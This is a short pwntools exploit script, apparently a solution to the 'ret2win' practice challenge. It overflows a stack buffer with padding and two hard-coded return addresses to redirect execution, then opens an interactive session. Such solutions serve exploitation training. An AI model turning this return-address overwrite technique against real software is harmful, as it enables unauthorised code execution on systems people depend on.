from pwn import *

p = process('./ret2win')

payload = b'A'*32 + b'B'*8
payload += p64(0x000000000040053e)
payload += p64(0x0000000000400756)
p.sendline(payload)
p.interactive()